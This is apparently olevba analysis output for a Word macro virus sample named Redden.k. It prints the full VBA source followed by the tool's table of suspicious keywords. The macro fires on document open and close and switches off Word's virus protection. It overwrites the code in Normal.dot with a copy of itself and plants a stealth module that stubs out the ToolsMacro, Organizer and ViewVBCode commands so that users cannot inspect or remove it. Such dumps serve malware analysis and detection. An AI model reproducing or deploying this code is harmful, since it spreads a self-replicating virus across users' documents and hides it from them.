olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.k-8acdd026a4301ee19176651ef09f73362e16495a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.k-8acdd026a4301ee19176651ef09f73362e16495a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()
'I is not spiteful macros :) ! I feed system(ini) 8(
On Error GoTo Phuck
VSav = ActiveDocument.Saved
Options.VirusProtection = False
Options.SaveNormalPrompt = False
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
SR = SR & "\system.ini"
Open SR For Append As #1
Randomize
How = Int(128 * Rnd)
For i = 0 To How
Next i
Close #1
If ThisDocument.FullName = NormalTemplate.FullName Then
    Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
    Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
    Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
    Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
    For j = 1 To cou
        dest.CodeModule.DeleteLines (1)
    Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    aprj = NormalTemplate.VBProject.VBComponents(i).Name
    If aprj = "HungrySYS" Then already = True
Next i
If Not already Then
        NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
        NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "HungrySYS"
        Set nor = NormalTemplate.VBProject.VBComponents("HungrySYS").CodeModule
        eol = Chr(13) + Chr(10)
        nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
        nor.AddFromString ("Sub Organizer" + eol + "End Sub")
        nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
        nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
If ((VSav = True) And (ActiveDocument.Saved = False)) Then ActiveDocument.Save
End Sub

Private Sub Document_Open()
'I is not spiteful macros :) ! I feed system(ini) 8(
On Error GoTo Phuck
VSav = ActiveDocument.Saved
Options.VirusProtection = False
Options.SaveNormalPrompt = False
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
SR = SR & "\system.ini"
Open SR For Append As #1
Randomize
How = Int(128 * Rnd)
For i = 0 To How
Next i
Close #1
If ThisDocument.FullName = NormalTemplate.FullName Then
    Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
    Set stlth = ActiveDocument.VBProject
    Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
    Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
    Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
    Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
    For j = 1 To cou
        dest.CodeModule.DeleteLines (1)
    Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
    For i = 1 To cnt
        aprj = stlth.VBComponents(i).Name
    If aprj = "HungrySYS" Then already = True
    Next i
Else
    already = False
End If
If Not already Then
    stlth.VBComponents.Add (vbext_ct_StdModule)
    stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "HungrySYS"
Set nor = stlth.VBComponents("HungrySYS").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
If ((VSav = True) And (ActiveDocument.Saved = False)) Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
